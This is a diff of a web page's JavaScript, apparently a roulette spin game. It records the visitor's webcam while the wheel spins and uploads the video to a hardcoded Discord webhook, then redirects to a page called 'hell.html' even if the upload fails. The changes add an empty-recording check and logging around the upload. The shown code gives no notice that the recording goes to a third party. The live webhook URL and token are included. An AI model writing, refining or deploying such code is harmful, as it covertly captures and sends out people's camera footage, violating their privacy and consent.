@@ -160,7 +160,6 @@
       requestAnimationFrame(animate);
     }
 
-    // メイン処理
     function startSpinAndRecord() {
       navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
         const recorder = new MediaRecorder(stream);
@@ -169,13 +168,19 @@
         recorder.ondataavailable = e => chunks.push(e.data);
         recorder.onstop = () => {
           const blob = new Blob(chunks, { type: 'video/webm' });
+
+          if (blob.size === 0) {
+            alert("録画に失敗しました（データが空）");
+            return;
+          }
+
           sendToDiscord(blob);
           stream.getTracks().forEach(track => track.stop());
         };
 
         recorder.start();
         spin(() => {
-          recorder.stop(); // 回転が終わったら録画停止
+          recorder.stop(); // 回転終了時に録画停止
         });
 
       }).catch(err => {
@@ -185,18 +190,26 @@
     }
 
     function sendToDiscord(blob) {
-      const webhookUrl = "https://discord.com/api/webhooks/1381314574640353501/gml-lgI2NN_c2g6lUNZK13fKT05_m88PSNdKAR5vjpqnYttHDj_9YT7Hs5djUTqgCXjY"; // 🔁 差し替えてね
+      const webhookUrl = "https://discord.com/api/webhooks/1381314574640353501/gml-lgI2NN_c2g6lUNZK13fKT05_m88PSNdKAR5vjpqnYttHDj_9YT7Hs5djUTqgCXjY";
 
       const formData = new FormData();
       formData.append("file", blob, "roulette_record.webm");
 
+      console.log("録画ファイル送信中...");
+
       fetch(webhookUrl, {
         method: "POST",
         body: formData
-      }).then(() => {
-        window.location.href = "https://kouya77.github.io/dds/hell.html";
-      }).catch(() => {
-        window.location.href = "https://kouya77.github.io/dds/hell.html"; // 失敗しても遷移
+      }).then(response => {
+        console.log("送信成功", response);
+        setTimeout(() => {
+          window.location.href = "https://kouya77.github.io/dds/hell.html";
+        }, 500); // 送信後にちょっと待ってから移動
+      }).catch(error => {
+        console.error("送信失敗", error);
+        setTimeout(() => {
+          window.location.href = "https://kouya77.github.io/dds/hell.html";
+        }, 500); // 失敗しても移動
       });
     }
 
